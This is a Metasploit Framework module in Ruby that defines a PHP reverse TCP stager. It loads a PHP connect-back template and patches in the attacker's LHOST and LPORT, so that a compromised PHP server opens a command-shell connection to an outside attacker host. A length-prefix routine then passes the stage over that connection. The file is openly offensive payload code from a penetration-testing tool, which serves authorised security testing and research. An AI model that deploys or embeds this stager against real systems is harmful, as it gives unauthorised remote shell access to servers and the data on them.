##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Php

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Reverse TCP Stager',
      'Description'   => 'Reverse PHP connect back stager with checks for disabled functions',
      'Author'        => 'egypt',
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Stager'        => {'Payload' => ""}
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'reverse_tcp.php'))
    reverse.gsub!("127.0.0.1", "#{datastore["LHOST"]}")
    reverse.gsub!("4444", "#{datastore["LPORT"]}")
    #reverse.gsub!(/#.*$/, '')
    #reverse = Rex::Text.compress(reverse)

    return super + reverse
  end

  #
  # PHP's read functions suck, make sure they know exactly how much data to
  # grab by sending a length.
  #
  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end
